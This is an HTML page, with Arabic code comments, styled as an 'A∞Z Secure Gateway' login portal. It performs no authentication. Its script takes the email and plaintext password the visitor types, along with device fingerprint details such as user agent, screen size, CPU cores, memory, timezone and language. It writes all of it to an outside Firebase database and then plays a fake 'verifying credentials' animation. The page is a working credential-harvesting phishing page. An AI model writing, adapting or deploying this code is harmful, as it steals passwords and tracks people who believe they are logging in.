<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>A∞Z | Authentication Portal</title>
    <style>
        body {
            background-color: #000000;
            color: #00ffcc;
            font-family: "Courier New", Courier, monospace;
            padding: 2em;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .login-box, #output {
            width: 100%;
            max-width: 400px;
            border: 1px solid #00ffcc;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
            background: #050505;
        }
        #output {
            display: none;
            max-width: 600px;
            border: none;
            box-shadow: none;
        }
        h2 {
            margin-top: 0;
            color: #ff0033;
            text-align: center;
            font-size: 16px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 10px;
            background: #111;
            border: 1px solid #00ffcc;
            color: #00ffcc;
            font-family: "Courier New", Courier, monospace;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            box-shadow: 0 0 8px #00ffcc;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background: transparent;
            color: #00ffcc;
            border: 1px solid #00ffcc;
            font-family: "Courier New", Courier, monospace;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }
        .submit-btn:hover {
            background: #00ffcc;
            color: #000000;
            box-shadow: 0 0 10px #00ffcc;
        }
        .line {
            margin-bottom: 0.8em;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
            word-break: break-all;
        }
        .highlight {
            color: #ff0033;
        }
        @keyframes fadeIn {
            to { opacity: 1; }
        }
    </style>
</head>
<body>

    <!-- نافذة تسجيل الدخول للإيميل والباسورد -->
    <div class="login-box" id="loginBox">
        <h2>[ A∞Z SECURE GATEWAY ]</h2>
        <form id="authForm">
            <div class="input-group">
                <label for="email">Identity / Email:</label>
                <input type="text" id="email" required autocomplete="off" placeholder="user@domain.com">
            </div>
            <div class="input-group">
                <label for="password">Access Key / Password:</label>
                <input type="password" id="password" required placeholder="••••••••">
            </div>
            <button type="submit" class="submit-btn">[ AUTHORIZE & CONNECT ]</button>
        </form>
    </div>

    <!-- الواجهة السينمائية بعد الضغط -->
    <div id="output"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

        const firebaseConfig = {
            databaseURL: "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById("authForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // التقاط الحقول المدخلة يدوياً
            const userEmail = document.getElementById("email").value;
            const userPass = document.getElementById("password").value;

            // إخفاء صندوق الدخول وإظهار العرض
            document.getElementById("loginBox").style.display = "none";
            const outputDiv = document.getElementById("output");
            outputDiv.style.display = "block";

            // جمع بيانات الجهاز
            const ua = navigator.userAgent;
            const platform = navigator.platform || "Unknown";
            const width = window.screen.width;
            const height = window.screen.height;
            const cores = navigator.hardwareConcurrency || "N/A";
            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language || "N/A";

            const sessionId = btoa(userEmail + width + height).slice(0, 16);

            // تجميع البيانات متضمنة الإيميل والباسورد المكتوبين
            const telemetryData = {
                sessionId: sessionId,
                inputEmail: userEmail,
                inputPassword: userPass,
                platform: platform,
                resolution: `${width}x${height}`,
                cores: cores,
                memory: memory,
                timezone: timezone,
                language: language,
                userAgent: ua,
                timestamp: new Date().toISOString()
            };

            // الحفظ المباشر في مسار A0Z_CORE المسموح به تماماً
            const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
            set(sessionsRef, telemetryData)
                .then(() => {
                    console.log("Successfully synced to A0Z_CORE/mirror_sessions/");
                })
                .catch((error) => {
                    console.error("Firebase write error:", error);
                });

            // طباعة العرض البصري السينمائي
            const lines = [
                "<span class='highlight'>[ A∞ZAI Structural Mirror v4.1 ]</span>",
                "Verifying credentials...",
                "Identity: " + userEmail,
                "Access Key: ********",
                "----------------------------------------",
                "Session ID: " + sessionId,
                "Platform: " + platform,
                "Screen Resolution: " + width + "x" + height,
                "Status: <span class='highlight'>SYNCED TO A0Z_CORE</span>",
                "----------------------------------------"
            ];

            lines.forEach((line, index) => {
                setTimeout(() => {
                    const div = document.createElement("div");
                    div.className = "line";
                    div.innerHTML = line;
                    outputDiv.appendChild(div);
                }, index * 300);
            });
        });
    </script>
</body>
</html>
